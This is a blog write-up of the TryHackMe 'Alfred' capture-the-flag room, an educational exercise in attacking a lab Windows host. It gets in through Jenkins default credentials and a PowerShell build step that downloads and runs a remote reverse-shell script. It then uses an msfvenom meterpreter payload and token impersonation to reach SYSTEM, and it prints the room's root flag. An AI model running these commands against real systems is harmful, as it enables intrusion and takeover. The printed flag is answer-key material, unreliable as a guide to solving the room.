---
title: Writeup for TryHackMe room - Alfred
author: 4n3i5v74
date: 2021-03-22 00:00:00 +0530
categories: [CTF, TryHackMe]
tags: [tryhackme, writeup, ctf, windows, privesc]
pin: false
---


<div class="flex-container">
  <script src="https://tryhackme.com/badge/34685"></script>
</div>


## [Alfred](https://tryhackme.com/room/alfred){:target="_blank"}

This room contains detailed info about jenkins exploitation and windows privilege escalation methods.

For complete tryhackme path, refer the [link](https://4n3i5v74.github.io/posts/getting-started-with-cybersecurity-tryhackme/){:target="_blank"}.


## Tools Used

### Enumeration

- NMAP

### Exploitation

- Netcat
- [Invoke-PowerShellTcp](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1){:target="_blank"}
- Msfvenom
- Msfconsole


## Task 1 - Initial Access

### References
- [NMAP Reference](https://4n3i5v74.github.io/posts/cheatsheet-nmap/){:target="_blank"}
- [invoke-powershelltcp reference](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1){:target="_blank"}


Use `nmap` to enumerate the target machine using `nmap -PN -T4 -sS --top-ports 1000 -A <ip>`

The output will be similar to
{% capture code %}{% raw %}Starting Nmap 7.60 ( https://nmap.org ) at 2021-04-28 06:10 BST
Nmap scan report for <hostname> (<ip>)
Host is up (0.00041s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  tcpwrapped
| ssl-cert: Subject: commonName=alfred
| Not valid before: 2021-04-27T04:28:50
|_Not valid after:  2021-10-27T04:28:50
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
MAC Address: 02:A1:17:7C:CE:0B (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows 8.1 R1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows Server 2008 or 2008 Beta 3 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE
HOP RTT     ADDRESS
1   0.41 ms <hostname> (<ip>)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.01 seconds{% endraw %}{% endcapture %} {% include code.html code=code %}

Use `firefox` to load the url `http://<ip>:8080`. Try login with default credentials `admin:admin` for the `jenkins` page.

The default login works, and `superuser` privilege in `jenkins` can be exploited to run native os commands.

Using `firefox` navigate to `project` and select `configure`. Open `build` which will allow native os commands to be passed on as part of build.

This exploit can be made use of, to create a `reverse shell`.

Create a `netcat` listener.
{% capture code %}{% raw %}rlwrap -cAr nc -lnvp 443{% endraw %}{% endcapture %} {% include code.html code=code %}

The output will be similar to
{% capture code %}{% raw %}Listening on [0.0.0.0] (family 0, port 443){% endraw %}{% endcapture %} {% include code.html code=code %}

Download the `Invoke-PowerShellTcp.ps1` script using
{% capture code %}{% raw %}wget https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1{% endraw %}{% endcapture %} {% include code.html code=code %}

Create a local python web server using
{% capture code %}{% raw %}python -m http.server 8080{% endraw %}{% endcapture %} {% include code.html code=code %}

The output will be similar to
{% capture code %}{% raw %}Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...{% endraw %}{% endcapture %} {% include code.html code=code %}

Use `firefox` to paste the following code in `jenkins` build page.
{% capture code %}{% raw %}powershell invoke-expression (New-Object Net.WebClient).DownloadString('http://<source-ip>:8080/Invoke-PowerShellTcp.ps1') ; Invoke-PowerShellTcp -Reverse -IPAddress <source-ip> -Port 443{% endraw %}{% endcapture %} {% include code.html code=code %}

Check the `console` on `python web server` to see if the file is downloaded. The output will be similar to `<target-ip> - - [28/Apr/2021 06:39:25] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -`.

Execution of the script `Invoke-PowerShellTcp.ps1` will create a `reverse shell`. The output of `netcat` console will be similar to
{% capture code %}{% raw %}Connection from <target-ip> 49257 received!
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project> whoami
alfred\bruce

PS C:\Program Files (x86)\Jenkins\workspace\project> type "C:\users\bruce\desktop\user.txt"
<flag>>{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 2 - Switching Shells

Use `msfvenom` to create a payload which spawns `meterpreter` shell on `msfconsole`.
{% capture code %}{% raw %}msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<source-ip> LPORT=443 -f exe -o shell.exe{% endraw %}{% endcapture %} {% include code.html code=code %}

The output will be similar to
{% capture code %}{% raw %}[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai chosen with final size 368
Payload size: 368 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe{% endraw %}{% endcapture %} {% include code.html code=code %}

Use `msfconsole -q` to create a `meterpreter` shell listener.
{% capture code %}{% raw %}msf5 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp

msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp

msf5 exploit(multi/handler) > set LHOST <source-ip>
LHOST => <source-ip>

msf5 exploit(multi/handler) > set LPORT 443
LPORT => 443

msf5 exploit(multi/handler) > run
[*] Started reverse TCP handler on <source-ip>:443{% endraw %}{% endcapture %} {% include code.html code=code %}

Create a local python web server using
{% capture code %}{% raw %}python -m http.server 8080{% endraw %}{% endcapture %} {% include code.html code=code %}

The output will be similar to
{% capture code %}{% raw %}Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...{% endraw %}{% endcapture %} {% include code.html code=code %}

From the `netcat` listener reverse shell, download the `shell.exe` file which was generated using `msfvenom`.
{% capture code %}{% raw %}powershell "(New-Object System.Net.WebClient).Downloadfile('http://<source-ip>:8080/shell.exe','shell.exe')"{% endraw %}{% endcapture %} {% include code.html code=code %}

Run the exploit binary using `start-process shell.exe`. There will be a session opened in `meterpreter`.
{% capture code %}{% raw %}[*] Sending stage (176195 bytes) to 10.10.50.154
[*] Meterpreter session 1 opened (10.10.192.53:443 -> 10.10.50.154:49326) at 2021-04-28 07:37:54 +0100
meterpreter >{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 3 - Privilege Escalation

### References
- [Windows access token reference](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens){:target="_blank"}
- [Abusing Token Privileges For LPE](https://www.exploit-db.com/papers/42556){:target="_blank"}


- Primary access tokens: those associated with a user account that are generated on log on
- Impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process

Different levels of impersonation token
- SecurityAnonymous: current user/client cannot impersonate another user/client
- SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client
- SecurityImpersonation: current user/client can impersonate the client's security context on the local system
- SecurityDelegation: current user/client can impersonate the client's security context on a remote system

Commonly abused privileges
- SeImpersonatePrivilege
- SeAssignPrimaryPrivilege
- SeTcbPrivilege
- SeBackupPrivilege
- SeRestorePrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege
- SeTakeOwnershipPrivilege
- SeDebugPrivilege


From the `meterpreter` session in `msfconsole`, check the current privileges.
{% capture code %}{% raw %}PS C:\Program Files (x86)\Jenkins\workspace\project> whoami /priv{% endraw %}{% endcapture %} {% include code.html code=code %}

The output will be similar to
{% capture code %}{% raw %}PRIVILEGES INFORMATION

Privilege Name                  Description                               State
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege         Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled{% endraw %}{% endcapture %} {% include code.html code=code %}

Background the current `meterpreter` session.
{% capture code %}{% raw %}C:\Program Files (x86)\Jenkins\workspace\project>^Z
Background channel 1? [y/N]  y{% endraw %}{% endcapture %} {% include code.html code=code %}

Load `incognito` mode.
{% capture code %}{% raw %}meterpreter > load incognito
Loading extension incognito...Success.{% endraw %}{% endcapture %} {% include code.html code=code %}

List the currently avilable tokens in `meterpreter` shell.
{% capture code %}{% raw %}meterpreter > list_tokens -g
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
            Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
\
BUILTIN\Administrators
BUILTIN\IIS_IUSRS
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization
NT AUTHORITY\WRITE RESTRICTED
NT SERVICE\AppHostSvc
NT SERVICE\AudioEndpointBuilder
NT SERVICE\BFE
NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\Dnscache
NT SERVICE\eventlog
NT SERVICE\EventSystem
NT SERVICE\FDResPub
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\MMCSS
NT SERVICE\PcaSvc
NT SERVICE\PlugPlay
NT SERVICE\RpcEptMapper
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\Spooler
NT SERVICE\TrkWks
NT SERVICE\TrustedInstaller
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\Winmgmt
NT SERVICE\WSearch
NT SERVICE\wuauserv

Impersonation Tokens Available
NT AUTHORITY\NETWORK
NT SERVICE\AudioSrv
NT SERVICE\CryptSvc
NT SERVICE\DcomLaunch
NT SERVICE\Dhcp
NT SERVICE\DPS
NT SERVICE\LanmanWorkstation
NT SERVICE\lmhosts
NT SERVICE\MpsSvc
NT SERVICE\netprofm
NT SERVICE\NlaSvc
NT SERVICE\nsi
NT SERVICE\PolicyAgent
NT SERVICE\Power
NT SERVICE\ShellHWDetection
NT SERVICE\TermService
NT SERVICE\W32Time
NT SERVICE\WdiServiceHost
NT SERVICE\WinHttpAutoProxySvc
NT SERVICE\wscsvc{% endraw %}{% endcapture %} {% include code.html code=code %}

Impersonate using `administrator` token.
{% capture code %}{% raw %}meterpreter > impersonate_token "BUILTIN\Administrators"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
            Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM{% endraw %}{% endcapture %} {% include code.html code=code %}

Check the current list of processes.
{% capture code %}{% raw %}meterpreter > ps

Process List

PID   PPID  Name                  Arch  Session  User                          Path
---   ----  ----                  ----  -------  ----                          ----
0     0     [System Process]
4     0     System                x64   0
396   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
524   516   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
572   564   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
580   516   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
608   564   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
668   580   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
676   580   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
684   580   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
772   668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
848   668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
916   668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
920   608   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
936   668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
992   668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
1016  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
1064  668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
1112  2056  powershell.exe        x86   0        alfred\bruce                  C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
1212  668   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
1240  668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
1356  668   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
1420  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
1448  668   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
1476  668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
1620  668   jenkins.exe           x64   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\jenkins.exe
1704  668   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
1708  668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
1712  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
1816  1620  java.exe              x86   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\jre\bin\java.exe
1844  668   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
1936  524   conhost.exe           x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
2056  1816  cmd.exe               x86   0        alfred\bruce                  C:\Windows\SysWOW64\cmd.exe
2064  1112  shell.exe             x86   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\workspace\project\shell.exe
2364  772   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
2668  2064  cmd.exe               x86   0        alfred\bruce                  C:\Windows\SysWOW64\cmd.exe
2840  524   conhost.exe           x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
2880  524   conhost.exe           x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
2988  668   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
3016  668   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
3068  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe{% endraw %}{% endcapture %} {% include code.html code=code %}

Migrate to `services.exe` process id and get the flag.
{% capture code %}{% raw %}meterpreter > migrate 668
[*] Migrating from 2064 to 668...
[*] Migration completed successfully.

meterpreter > cat "C:\Windows\System32\config\root.txt"
dff0f748678f280250f25a45b8046b4a{% endraw %}{% endcapture %} {% include code.html code=code %}

